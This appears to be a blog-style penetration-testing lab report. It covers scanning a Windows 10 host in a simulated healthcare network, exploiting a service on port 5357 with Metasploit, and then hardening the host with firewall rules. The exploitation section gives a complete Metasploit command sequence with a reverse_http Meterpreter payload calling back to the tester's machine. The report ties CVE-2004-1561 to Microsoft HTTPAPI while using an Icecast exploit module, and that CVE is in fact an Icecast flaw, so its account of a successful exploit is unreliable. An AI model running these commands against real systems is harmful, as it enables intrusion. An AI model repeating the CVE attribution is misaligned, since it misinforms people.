# VAPT Report on HTTPAPI Services in Windows 10 Healthcare Endpoint

### This report documents a targeted VAPT simulation that exploited Microsoft HTTPAPI via port 5357 to assess system misconfigurations and apply mitigation through service hardening and firewall enforcement.

---

## **🔐 Introduction**

Healthcare infrastructures, often relying on legacy systems and misconfigured services, are increasingly vulnerable to low-effort exploitation. This project simulates an internal red team operation aimed at identifying and exploiting known vulnerabilities in a Windows 10 machine running insecure HTTPAPI-based services through port 5357.

The core of this engagement revolved around discovering the presence of UPnP/SSDP exposure via Microsoft HTTPAPI, mapping the service using Nmap, confirming its version and exploitability, and ultimately weaponizing the vulnerability CVE-2004-1561 using Metasploit. This attack demonstrates how seemingly harmless services—like those used for device discovery—can be leveraged for unauthorized access.

This report also focuses on enforcing system hardening measures by applying firewall rules and disabling insecure ports and services—thus closing the attack surface.

---

# Vulnerability Assessment and Penetration Testing (VAPT) Report

## Target: Windows 10 Host – Healthcare Environment

**Prepared by:** Aditya Bhatt
**Designation:** VAPT Analyst | Cybersecurity Professional
**Contact:** [info.adityabhatt3010@gmail.com](mailto:info.adityabhatt3010@gmail.com) | +91-9818993884

---

## Executive Summary

This report documents a security assessment of a Windows 10 endpoint within a simulated healthcare environment. The VAPT focused on identifying misconfigured or exposed services—specifically the HTTPAPI httpd 2.0 service running on TCP port 5357, typically associated with SSDP/UPnP protocols.

Through network scanning and service enumeration, the system was found to be vulnerable to CVE-2004-1561—a known flaw in the HTTP header parsing of the Microsoft HTTPAPI. The vulnerability was exploited using Metasploit's `icecast_header` module with a reverse HTTP Meterpreter payload, granting shell access.

The service was later disabled, and custom firewall rules were applied to prevent further exploitation. The system was successfully hardened, verified by a follow-up port scan.

---

## Objectives

* Identify HIPAA compliance requirements as part of baseline regulatory understanding.
* Perform enumeration and vulnerability mapping on a Windows 10 machine.
* Exploit discovered HTTPAPI service using a known CVE.
* Harden the system by disabling insecure services and enforcing firewall rules.

---

## Methodology

### Task 1: HIPAA Requirements Review

Before technical assessment, HIPAA compliance standards were analyzed:

* **Privacy Rule:** Ensures PHI is accessed only with patient consent.
* **Security Rule:** Requires encryption, access controls, and audit mechanisms for ePHI.
* **Breach Notification:** Any breach of unsecured PHI must be reported to HHS.
* **Enforcement Rule & Omnibus Rule:** Defines penalties and extends compliance to third-party vendors.

---

### Task 2: Network & Service Enumeration

1. **Target IP Identification**

   Command:

   ```bash
   ipconfig
   ```

   Output: IP Address of Windows host – `192.168.178.142`

2. **Live Host Discovery**

   ```bash
   nmap -sn 192.168.178.1/24
   ```

   Identified active host: `192.168.178.142`

3. **Service Enumeration**

   ```bash
   nmap -sS 192.168.178.142
   nmap -sV -p5357 192.168.178.142
   ```

   Detected: HTTPAPI httpd 2.0 on TCP port 5357

---

### Task 3: Vulnerability Exploitation

* **Vulnerability:** CVE-2004-1561
* **Exploit Module:** `exploit/windows/http/icecast_header`
* **Payload:** `windows/meterpreter/reverse_http`

Metasploit Setup:

```bash
msfconsole
use exploit/windows/http/icecast_header
set payload windows/meterpreter/reverse_http
set RHOSTS 192.168.178.142
set RPORT 5357
set LHOST 192.168.178.137
exploit
```

Post-exploit command:

```bash
sysinfo
```

Outcome: Successfully obtained system details, confirming access via reverse shell.

---

### Task 4: Hardening the Target System

**Steps:**

* Navigate to Windows Firewall → Advanced Settings
* Create custom inbound/outbound rules to block port `5357`
* Disable UPnP-related services, if active

---

### Task 5: Post-Hardening Validation

Re-run port scan:

```bash
nmap -sV -p5357 192.168.178.142
```

Status: Port is now closed/filtered. No response from HTTPAPI service.

---

## Key Findings

* TCP port 5357 exposed to LAN with vulnerable HTTPAPI service
* Vulnerability exploited successfully using Metasploit
* Legacy protocol (UPnP) remains active on healthcare system endpoints
* No firewall rules or monitoring in place at time of scan

---

## Risk Analysis

| Risk                             | Impact | Likelihood | Risk Level |
| -------------------------------- | ------ | ---------- | ---------- |
| CVE Exploitation on Port 5357    | High   | High       | Critical   |
| Misconfigured UPnP/SSDP Services | High   | Medium     | High       |
| Absence of Endpoint Firewalls    | Medium | High       | High       |
| Unpatched HTTPAPI Library        | High   | Medium     | High       |

---

## Recommendations

### 1. Service Management

* Disable UPnP, SSDP, and HTTPAPI if not required
* Ensure only essential services are running

### 2. Patch Management

* Apply all security patches regularly
* Monitor for CVEs associated with system components

### 3. Firewall Configuration

* Apply deny-all by default
* Allow traffic only to known required ports/services

### 4. Network Segmentation

* Isolate legacy systems or medical endpoints from production networks

### 5. HIPAA Alignment

* Enforce access controls and breach reporting mechanisms
* Audit connected systems for PHI exposure

---

## Conclusion

This assessment confirms that even default Windows services like HTTPAPI can be exploited with well-known CVEs when misconfigured and unpatched. Through Nmap, Metasploit, and proper verification, the attack vector was proven effective, and the mitigation strategy—firewall hardening and service disabling—successfully secured the machine.

This case highlights the critical need for continuous vulnerability monitoring, strict firewall configurations, and minimal exposure of services on internal networks—especially in regulated environments like healthcare.

---

## **🛡️ Final Thoughts**

In cybersecurity, what’s running silently in the background often presents the loudest threat. The convenience of auto-discovery protocols like UPnP comes with serious risks if left unchecked. This exercise proves how easily attackers can exploit legacy endpoints if visibility, patching, and access controls are neglected.

Harden first. Monitor always. Trust nothing by default.

Thanks for reading. Stay sharp, stay secured.

**#cybersecurity #vapt #upnp #networksecurity #healthcareinfosec**

---
